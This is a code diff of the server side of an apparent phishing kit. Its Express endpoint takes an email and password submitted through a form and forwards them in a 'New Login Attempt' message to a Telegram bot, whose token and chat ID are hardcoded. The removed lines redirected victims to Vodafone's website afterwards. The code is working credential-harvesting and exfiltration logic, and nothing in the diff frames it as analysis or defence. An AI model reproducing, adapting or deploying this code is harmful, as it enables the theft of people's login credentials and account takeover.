@@ -9,9 +9,9 @@ app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Your Telegram Bot Info
-const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE'; // YOUR BOT TOKEN
-const chatId = '7587120060'; // YOUR CHAT ID
+// Replace with your Telegram bot token and chat ID
+const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE'; // Bot Token
+const chatId = '7587120060'; // Chat ID
 
 // Handle POST request
 app.post('/api/submit', async (req, res) => {
@@ -19,7 +19,7 @@ app.post('/api/submit', async (req, res) => {
     const { email, password } = req.body;
 
     if (!email || !password) {
-      return res.status(400).json({ error: 'Email and password are required.' });
+      return res.status(400).json({ error: 'Email and password required' });
     }
 
     const message = `🚨 New Login Attempt 🚨\n\nEmail: ${email}\nPassword: ${password}`;
@@ -29,13 +29,11 @@ app.post('/api/submit', async (req, res) => {
       text: message
     });
 
-    return res.status(200).json({ redirect: 'https://www.vodafone.co.uk/ ' });
+    return res.status(200).json({ success: true });
   } catch (error) {
-    console.error("Error submitting form:", error.message);
-    return res.status(500).json({ error: "Failed to send data." });
+    console.error('Error:', error.message);
+    return res.status(500).json({ error: 'Failed to send credentials' });
   }
 });
-
-app.options('/api/submit', cors());
 
 module.exports = app;
